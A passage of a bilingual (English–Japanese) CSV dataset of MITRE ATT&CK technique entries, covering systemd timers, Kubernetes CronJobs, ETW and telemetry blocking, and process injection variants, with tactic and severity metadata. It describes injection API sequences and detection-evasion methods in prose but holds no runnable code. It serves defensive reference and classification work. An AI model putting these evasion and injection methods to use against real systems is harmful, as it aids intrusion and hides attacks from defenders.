privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",攻撃者は、悪意のあるコードの初期実行または定期実行のためのタスクスケジューリングを実行するために、systemdタイマーを悪用する可能性があります。 Systemdタイマーは、サービスを制御するファイル拡張子<code>.timer</code>のユニットファイルである。タイマーは、カレンダーイベント時または開始点からの時間経過後に実行されるよう設定可能。Linux環境における[Cron](https://attack.mitre.org/techniques/T1053/003)の代替として使用できる。(出典: archlinux Systemd Timers Aug 2020) Systemdタイマーは、[SSH](https://attack.mitre.org/techniques/T1021/004)経由で動作する<code>systemctl</code>コマンドラインユーティリティにより遠隔から起動される可能性があります。(引用: Systemd Remote Control) 各 <code>.timer</code> ファイルには、同じ名前の対応する <code>.service</code> ファイルが必要です。例えば、<code>example.timer</code> と <code>example.service</code> です。 <code>.service</code>ファイルは、systemdシステムおよびサービスマネージャーによって管理される[Systemd Service](https://attack.mitre.org/techniques/T1543/002)ユニットファイルです。(引用元: Linux man-pages: systemd January 2014)特権タイマーは<code>/etc/systemd/system/</code>および<code>/usr/lib/systemd/system</code>に、ユーザーレベルタイマーは<code>~/.config/systemd/user/</code>に記述されます。攻撃者はsystemdタイマーを利用し、システム起動時やスケジュールに基づいて悪意のあるコードを実行し、永続化を図ることが可能です。(引用元: Arch Linux Package Systemd Compromise BleepingComputer 2018年7月10日)(引用元: gist Arch package compromise 2018年7月10日)(引用元: acroread package compromised Arch Linux Mail 2018年7月8日)特権パスを使用してインストールされたタイマーは、rootレベルの永続性を維持するために使用される可能性があります。 攻撃者はユーザーレベルでの永続化を達成するため、ユーザーレベルタイマーをインストールする可能性もある。(引用: Falcon Sandbox smp: 28553b3a9d),execution;persistence;privilege-escalation,Linux,remote_service_abuse,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21,2020-10-12T17:50:31.584Z,2025-04-15T19:58:55.648Z,,,,
T1053.007,T1053,Container Orchestration Job,コンテナオーケストレーションジョブ,"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster. In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",攻撃者は、Kubernetesなどのコンテナオーケストレーションツールが提供するタスクスケジューリング機能を悪用し、悪意のあるコードを実行するように構成されたコンテナのデプロイをスケジュールする可能性があります。コンテナオーケストレーションジョブは、Linuxシステムのcronジョブと同様に、特定の日時にこれらの自動化されたタスクを実行します。この種のデプロイは、時間の経過とともに一定数のコンテナを維持するように構成することもでき、クラスタ内での永続性を維持するプロセスを自動化します。 Kubernetesでは、CronJobを使用して、特定のタスクを実行するために1つ以上のコンテナを起動するJobをスケジュールすることが可能です。(引用: Kubernetes Jobs)(引用: Kubernetes CronJob) したがって、攻撃者はCronJobを利用して、クラスター内の複数のノードで悪意のあるコードを実行するJobのデプロイをスケジュールする可能性があります。(引用: Threat Matrix for Kubernetes),execution;persistence;privilege-escalation,Containers,other,privilege_gain,endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--1126cab1-c700-412f-a510-61f4937bb096,2021-03-29T17:06:22.247Z,2025-04-15T19:58:07.487Z,,,,
T1054,,Indicator Blocking,インジケータ遮断,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.",攻撃者は、センサーによって通常収集されるインジケーターやイベントの収集・分析を妨害しようとする可能性があります。これには、イベントテレメトリの収集とフローを制御する設定を改ざんすることで、Event Tracing for Windows (ETW)（引用元：Microsoft About Event Tracing 2018）などのホストベースセンサーを悪意を持ってリダイレクト（引用元：Microsoft Lamin Sept 2017）または無効化することが含まれます。（引用元： 中リスク イベントトレース改ざん 2018年）これらの設定は、構成ファイルやレジストリに保存されるほか、[PowerShell](https://attack.mitre.org/techniques/T1086)や[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)などの管理ユーティリティからもアクセス可能です。 ETWの中断は複数の方法で達成可能ですが、最も直接的な手法はPowerShellのSet-EtwTraceProviderコマンドレットで条件を定義するか、レジストリに直接アクセスして変更を加えることです。 ネットワークベースの指標報告の場合、攻撃者は中央分析を妨げるため、報告に関連するトラフィックをブロックする可能性があります。これには、テレメトリ転送を担当するローカルプロセスの停止や、セキュリティ情報イベント管理（SIEM）製品などイベント集約を担当する特定ホストへのトラフィックをブロックするホストベースのファイアウォールルールの作成など、様々な手段が用いられます。,defense-evasion,Windows,script_command_execution,stealth,authentication_system;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df,2017-05-31T21:30:47.384Z,2025-04-25T15:15:40.534Z,,,,
T1055,,Process Injection,プロセスインジェクション,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権を昇格させるために、プロセスにコードを注入することがあります。プロセスインジェクションとは、別の稼働中のプロセスのアドレス空間内で任意のコードを実行する方法です。別のプロセスのコンテキストでコードを実行することで、そのプロセスのメモリやシステム/ネットワークリソースへのアクセスが可能になり、場合によっては特権が昇格される可能性があります。プロセスインジェクションによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検出を回避することもできます。 プロセスへのコード注入には多くの手法が存在し、その多くは正当な機能を悪用する。これらの実装は主要OSすべてに存在するが、通常はプラットフォーム固有である。より洗練されたサンプルでは、モジュールを分割し検出回避を強化するため、複数回のプロセス注入を実行する場合がある。この際、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する。,defense-evasion;privilege-escalation,Linux;macOS;Windows,c2_communication,privilege_gain,privileged_account;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d,2017-05-31T21:30:47.843Z,2025-04-16T20:37:16.893Z,,,,
T1055.001,T1055,Dynamic-link Library Injection,ダイナミックリンクライブラリ注入,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては権限昇格を図るため、動的リンクライブラリ（DLL）をプロセスに注入することがある。DLL注入は、別の実行中プロセスのアドレス空間内で任意のコードを実行する手法である。DLL注入は通常、ターゲットプロセスの仮想アドレス空間にDLLのパスを書き込み、新規スレッドを起動してDLLをロードすることで実行される。 書き込みは<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>といったネイティブWindows API呼び出しで実行可能であり、その後<code>CreateRemoteThread</code>（DLLロードを担当する<code>LoadLibrary</code> APIを呼び出す）で起動される。 (引用元: Elastic Process Injection 2017年7月) この手法の変種であるリフレクティブDLLインジェクション（自己マッピングDLLをプロセスに書き込む）やメモリモジュール（プロセス書き込み時にDLLをマップ）は、アドレス再配置の問題と実行呼び出しに必要な追加APIを克服します（これらの手法は<code>LoadLibrary</code>の機能を事前に手動で実行することで、メモリ内でファイルをロード・実行するため）。(引用: Elastic HuntingNMemory 2017年6月)(引用: Elastic Process Injection 2017年7月) この手法の別のバリエーションとして、モジュールストンプ/オーバーロードまたはDLLホローイングと呼ばれる手法が、プロセス内に注入されたコードを隠蔽するために活用されることがある。 この手法では、正当なDLLをリモートプロセスにロードした後、ターゲットプロセス内で新規スレッドを開始する前に、モジュールの<code>AddressOfEntryPoint</code>を手動で上書きします。(引用: Module Stomping for Shellcode Injection) この変種により、攻撃者はディスク上の正当なDLLファイルで実行を裏付けることで、悪意のある注入コードを隠蔽できる可能性があります。（引用元：Hiding Malicious Code with Module Stomping）別プロセスのコンテキストでコードを実行することで、そのプロセスのメモリやシステム／ネットワークリソースへのアクセス、場合によっては昇格された権限の取得が可能となる。DLLインジェクションによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もある。,defense-evasion;privilege-escalation,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945,2020-01-14T01:26:08.145Z,2025-04-16T20:37:22.834Z,,,,
T1055.002,T1055,Portable Executable Injection,ポータブル実行可能ファイルの注入,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権を昇格させるために、ポータブル実行可能ファイル（PE）をプロセスに注入することがあります。PEインジェクションは、別の稼働中のプロセスのアドレス空間で任意のコードを実行する方法です。PEインジェクションは通常、コード（ディスク上のファイルなしの場合もある）をターゲットプロセスの仮想アドレス空間にコピーし、新しいスレッドを介して呼び出すことで実行されます。 書き込みは<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行可能であり、<code>CreateRemoteThread</code>または追加コード（例：シェルコード）で呼び出される。注入コードの変位により、メモリ参照の再マッピング機能が必要となる。 （引用元: Elastic Process Injection July 2017）別プロセスのコンテキストでコードを実行することで、そのプロセスのメモリやシステム/ネットワークリソースへのアクセス、場合によっては昇格された特権の取得が可能となる。PEインジェクションによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もある。,defense-evasion;privilege-escalation,Windows,script_command_execution,privilege_gain,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662,2020-01-14T01:27:31.344Z,2025-04-25T14:47:15.984Z,,,,
T1055.003,T1055,Thread Execution Hijacking,スレッド実行ハイジャック,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017) This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権を昇格させるために、ハイジャックしたプロセスに悪意のあるコードを注入することがあります。スレッド実行ハイジャックは、別の稼働中のプロセスのアドレス空間で任意のコードを実行する方法です。スレッド実行ハイジャックは、通常、既存のプロセスを一時停止し、そのメモリをアンマップ/ホロー化することで実行されます。これにより、メモリ領域を悪意のあるコードやDLLへのパスで置き換えることが可能になります。 まず、<code>OpenThread</code>などのネイティブWindows API呼び出しで既存の被害プロセスへのハンドルを作成する。この時点でプロセスをサスペンドし、<code>SuspendThread</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、<code>ResumeThread</code>を順に呼び出して、書き換え、注入コードへの再配置、再開を行う。（引用元: Elastic Process Injection July 2017）これは[プロセスホローイング](https://attack.mitre.org/techniques/T1055/012)と非常に類似しているが、サスペンド状態のプロセスを作成するのではなく既存プロセスを標的とする。別プロセスのコンテキストでコードを実行することで、対象プロセスのメモリやシステム/ネットワークリソースへのアクセス、場合によっては昇格された特権の取得が可能となる。 スレッド実行ハイジャックによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もあります。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6,2020-01-14T01:28:32.166Z,2025-04-25T14:46:28.558Z,,,,
T1055.004,T1055,Asynchronous Procedure Call,非同期プロシージャコール,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権を昇格させるために、非同期プロシージャコール（APC）キューを介してプロセスに悪意のあるコードを注入する可能性があります。APCインジェクションは、別の稼働中のプロセスのアドレス空間で任意のコードを実行する方法です。APCインジェクションは、通常、プロセスのスレッドのAPCキュー（引用元：Microsoft APC）に悪意のあるコードを添付することで実行されます。 キュー化されたAPC関数は、スレッドが変更可能な状態に入った際に実行される（引用元：Microsoft APC）。まず<code>OpenThread</code>などのネイティブWindows API呼び出しで既存の被害プロセスへのハンドルを作成する。この時点で<code>QueueUserAPC</code>を使用して関数（悪意のあるDLLを指す<code>LoadLibraryA</code>など）を呼び出せる。 APCインジェクションの変種である「アーリーバードインジェクション」は、プロセスエントリポイント（および潜在的に後続のアンチマルウェアフック）以前にAPC経由で悪意のあるコードを書き込み実行可能なサスペンド状態のプロセスを生成する手法である。（引用元：CyberBit Early Bird Apr 2018）アトムボンビング（引用元： ENSIL AtomBombing Oct 2016）は、グローバルアトムテーブルに事前に書き込まれた悪意のあるコードをAPCで呼び出す別の変種です。（引用元：Microsoft Atom Table）別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる可能性があります。APCインジェクションによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検出を回避する可能性もあります。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605,2020-01-14T01:29:43.786Z,2025-04-25T14:47:11.435Z,,,,
T1055.005,T1055,Thread Local Storage,スレッドローカルストレージ,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process Ememory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権昇格を図るため、スレッドローカルストレージ（TLS）コールバックを介してプロセスに悪意のあるコードを注入することがあります。TLSコールバック注入は、別の実行中プロセスのアドレス空間で任意のコードを実行する方法です。TLSコールバック注入では、ポータブル実行可能ファイル（PE）内のポインタを操作し、コードの正当なエントリポイントに到達する前にプロセスを悪意のあるコードへリダイレクトします。 TLSコールバックは通常、OSがスレッドで使用するデータのセットアップやクリーンアップに使用されます。 TLSコールバックの操作は、[プロセスホローイング](https://attack.mitre.org/techniques/T1055/012)などの他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)技術を用いて、プロセスメモリ空間内の特定のオフセットを割り当て書き込むことで実行される可能性がある。(引用: FireEye TLS 2017年11月) 別プロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる。TLSコールバック注入による実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もある。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744,2020-01-14T01:30:41.092Z,2025-04-25T14:48:21.860Z,,,,
T1055.008,T1055,Ptrace System Calls,Ptraceシステムコール,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes Ememory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権を昇格させるために、ptrace（プロセストレース）システムコールを介してプロセスに悪意のあるコードを注入する可能性があります。ptraceシステムコール注入は、別の稼働中のプロセスのアドレス空間で任意のコードを実行する方法です。 Ptraceシステムコール注入は、実行中のプロセスへのアタッチと改変を伴う。ptraceシステムコールは、デバッグプロセスが別のプロセス（および個々のスレッド）を監視・制御することを可能にし、メモリやレジスタ値の変更を含む操作を実行できる。(出典: PTRACE マニュアルページ) Ptraceシステムコール注入は、通常、実行中のプロセス（例: <code>malloc</code>）に任意のコードを書き込んだ後、<code>PTRACE_SETREGS</code>でそのメモリ領域を呼び出し、次に実行する命令を含むレジスタを設定することで実行されます。 Ptraceシステムコール注入は<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>でも可能であり、これらはターゲットプロセスのメモリ内特定アドレス（例：次の命令の現在のアドレス）にデータをコピーする。 (引用: PTRACE man)(引用: Medium Ptrace JUL 2018) Ptrace システムコールの注入は、子プロセスではないプロセスや、より高い特権を持つプロセスをターゲットにした場合、不可能である可能性がある。(引用: BH Linux Inject) 別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる。 ptrace システムコール注入による実行は、正当なプロセスに隠蔽されるため、セキュリティ製品の検知を回避する可能性もある。,defense-evasion;privilege-escalation,Linux,other,privilege_gain,privileged_account;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f,2020-01-14T01:33:19.065Z,2025-04-25T14:48:25.896Z,,,,
T1055.009,T1055,Proc Memory,Procメモリ,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes Estack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes Ememory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、特権昇格の可能性を得るために、/proc ファイルシステムを介してプロセスに悪意のあるコードを注入する可能性があります。Proc メモリ注入は、別の稼働中のプロセスのアドレス空間で任意のコードを実行する方法です。 Proc メモリ注入では、/proc ファイルシステム（<code>/proc/[pid]</code>）を介してプロセスのメモリを列挙し、利用可能なガジェット/命令を用いてリターン指向プログラミング（ROP）ペイロードを作成します。各実行プロセスには、メモリマッピングを含む独自のディレクトリがあります。Proc メモリ注入は、/proc ファイルシステムが提供するメモリマッピングを使用して、ターゲットプロセスの Estack を上書きすることで一般的に実行されます。 この情報は、アドレス空間配置ランダム化（ASLR）などのプロセスメモリ保護によって隠蔽されているオフセット（スタックを含む）やガジェット（悪意のあるペイロード構築に利用可能なプログラム内の命令）を列挙するために使用できる。列挙後、<code>/proc/[pid]/maps</code>内のターゲットプロセスのメモリマップをddコマンドで上書き可能となる。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man) [動的リンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)などの他の手法を用いて、ターゲットプロセスに利用可能なガジェットを追加することも可能です。 [プロセス・ホローイング](https://attack.mitre.org/techniques/T1055/012)と同様に、procメモリ注入は子プロセス（バックグラウンドで実行中のsleepのコピーなど）を標的とすることがあります。(引用: GDS Linux Injection) 別のプロセスのコンテキストでコードを実行することで、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる場合があります。 プロセスメモリ注入による実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もある。,defense-evasion;privilege-escalation,Linux,discovery_enumeration,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591,2020-01-14T01:34:10.588Z,2025-04-25T14:48:08.263Z,,,,
T1055.011,T1055,Extra Window Memory Injection,追加ウィンドウメモリ注入,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function) Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権昇格を図るため、追加ウィンドウメモリ（EWM）を介してプロセスに悪意のあるコードを注入する可能性がある。EWM注入は、別の実行中プロセスのアドレス空間で任意のコードを実行する方法である。ウィンドウを作成する前に、グラフィカルなWindowsベースのプロセスは、外観と動作を規定するウィンドウクラスを指定または登録しなければならない（データ入出力を処理する関数であるウィンドウプロシージャを介して）。(出典: Microsoft Window Classes) 